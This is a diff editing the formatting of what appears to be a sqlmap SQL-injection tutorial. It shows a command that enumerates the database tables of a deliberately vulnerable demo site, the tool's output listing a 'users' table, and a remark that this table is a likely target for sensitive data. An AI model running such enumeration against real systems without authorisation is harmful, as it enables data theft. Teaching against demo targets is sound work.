@@ -130,9 +130,12 @@ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables -
 
 Example output:
 
-bash
+Example output:
+
+```bash
 Database: acuart
 [8 tables]
+
 +-----------+
 | artists   |
 | carts     |
@@ -143,6 +146,8 @@ Database: acuart
 | products  |
 | users     |
 +-----------+
+```
+
 
 
 The users table is a likely target for sensitive data.
